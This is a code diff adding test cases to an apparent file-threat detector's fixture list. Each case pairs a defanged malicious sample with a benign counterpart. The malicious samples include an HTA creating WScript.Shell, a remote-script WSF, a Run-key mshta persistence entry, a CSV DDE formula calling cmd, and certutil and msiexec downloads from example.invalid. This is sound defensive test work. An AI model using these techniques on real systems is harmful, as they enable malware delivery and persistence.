@@ -408,6 +408,60 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             zipped("word/document.xml", b"<w:document/>"),
         ),
         ("container_disk_image_dmg", magic_tail(b"koly"), b"0123456789"),
+        (
+            "win_hta_shell_object",
+            b'<html><head><hta:application id="x"/><script>'
+            b'var o = new ActiveXObject("WScript.Shell");</script></head></html>',
+            b'<html><head><hta:application id="x"/><script>'
+            b'document.title = "inert";</script></head></html>',
+        ),
+        (
+            "win_wsf_remote_script",
+            b'<job id="x"><script language="JScript" src="https://example.invalid/inert.js"></script></job>',
+            b'<job id="x"><script language="JScript">WScript.Echo("inert");</script></job>',
+        ),
+        (
+            "win_msc_console_remote",
+            b'<?xml version="1.0"?><MMC_ConsoleFile ConsoleVersion="3.0"><StringTable>'
+            b'<String ID="1">https://example.invalid/inert.html</String></StringTable></MMC_ConsoleFile>',
+            b'<?xml version="1.0"?><MMC_ConsoleFile ConsoleVersion="3.0"><StringTable>'
+            b'<String ID="1">Services (Local)</String></StringTable></MMC_ConsoleFile>',
+        ),
+        (
+            "win_reg_run_interpreter",
+            b"Windows Registry Editor Version 5.00\r\n\r\n"
+            b"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n"
+            b'"Updater"="mshta.exe C:\\inert\\page.hta"\r\n',
+            b"Windows Registry Editor Version 5.00\r\n\r\n"
+            b"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n"
+            b'"OneDrive"="C:\\Users\\me\\AppData\\Local\\OneDrive\\OneDrive.exe /background"\r\n',
+        ),
+        ("doc_onenote_embedded_launcher", _onenote(mini_pe()), _onenote(b"%PDF-1.4 inert")),
+        (
+            "doc_spreadsheet_formula_exec",
+            b"name,amount\r\n=cmd|' /C inert'!A0,1\r\n",
+            b"name,amount\r\n=SUM(A1:A2),1\r\n",
+        ),
+        (
+            "doc_spreadsheet_formula_exec",
+            b"WEB\r\n1\r\nhttps://example.invalid/query.php\r\n",
+            b"WEB QUERY NOTES\r\nhttps://example.invalid/docs\r\n",
+        ),
+        (
+            "web_ms_protocol_lure",
+            b'<a href="ms-appinstaller:?source=https://example.invalid/inert.msix">install</a>',
+            b'<a href="ms-settings:windowsupdate">settings</a>',
+        ),
+        (
+            "win_lolbin_download",
+            b"certutil -urlcache -split -f https://example.invalid/inert.txt inert.txt\n",
+            b"certutil -hashfile inert.txt SHA256\n",
+        ),
+        (
+            "win_lolbin_download",
+            b"msiexec /i https://example.invalid/inert.msi /qn\n",
+            b"msiexec /i C:\\installers\\inert.msi /qn\n",
+        ),
     ]
 
 
@@ -426,6 +480,15 @@ def _library(url: bytes) -> bytes:
         b"<url>" + url + b"</url></simpleLocation></searchConnectorDescription>"
         b"</searchConnectorDescriptionList></libraryDescription>\r\n"
     )
+
+
+def _onenote(data: bytes) -> bytes:
+    """A .one header, then one FileDataStoreObject whose payload is ``data``."""
+    import struct
+
+    header = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3")
+    store = bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac")
+    return header + bytes(64) + store + struct.pack("<Q", len(data)) + bytes(12) + data + bytes(16)
 
 
 def _smuggle() -> bytes:
